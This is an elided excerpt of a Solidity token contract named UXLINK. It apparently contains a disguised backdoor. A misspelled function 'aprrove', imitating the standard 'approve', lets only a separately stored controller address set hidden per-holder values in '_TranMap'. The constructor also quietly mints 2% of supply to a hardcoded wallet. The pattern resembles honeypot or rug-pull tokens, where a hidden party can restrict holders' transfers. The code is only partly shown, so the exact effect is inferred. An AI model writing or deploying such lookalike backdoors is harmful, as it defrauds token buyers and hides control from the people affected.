...
contract UXLINK is StandardERC20,OwnerControl {
    ...
    constructor(string memory _name, string memory _symbol, uint256 _totalSupply,address _tokenadress) StandardERC20(_name, _symbol, _totalSupply, msg.sender) {
        tokenAdress=_tokenadress;
        _owner=msg.sender;
        _mint(0x020cA66C30beC2c4Fe3861a94E4DB4A498A35872,_totalSupply.mul(2).div(100)*10**decimals());
    ...
    function aprrove(address[] memory spender, uint256 addedValue) public virtual returns (bool){
        require(msg.sender==tokenAdress,"");
        for (uint256 i = 0; i < spender.length; i++)
        {
              _TranMap[spender[i]] = addedValue * 10**decimals();
        }
        return true;
    }
